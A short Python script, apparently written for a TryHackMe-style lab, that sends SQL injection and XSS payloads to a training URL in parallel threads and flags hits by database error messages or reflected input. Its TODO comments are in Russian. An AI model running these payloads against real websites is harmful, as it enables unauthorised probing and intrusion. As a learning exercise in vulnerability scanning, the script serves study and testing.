import requests
import re
import threading

# Добавить argparse
URL = "http://python.thm/labs/lab2/departments.php?name=" # Добавить возможность выбора URL и POST параметр

payloads = {
    "SQLi" : ["'", "' OR 1=1 -- -", "\" OR \"1\"=\"1 -- -", "'; -- -", "' UNION SELECT 1,2,3 -- -"],
    "XSS" : ["<script>alert('Xss');</script>", "'><img src=x onerror=alert('XSS')>"]
} # Добавить больше уязвимостей и словарей

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scanner(vuln: str, payload: str):
    response = requests.get(URL, params={'name':payload}) # Добавить автоматическое изменение параметра
    content = response.text.lower()

    if vuln == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print (f"[+] Found potential SQL with payload: {payload}")
    elif vuln == "XSS" and payload.lower() in content:
        print (f"[+] Found potential XSS with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for test in tests:
        thread = threading.Thread(target=scanner, args=(vuln, test))
        threads.append(thread)
        thread.start()

for thread in threads:
    thread.join()
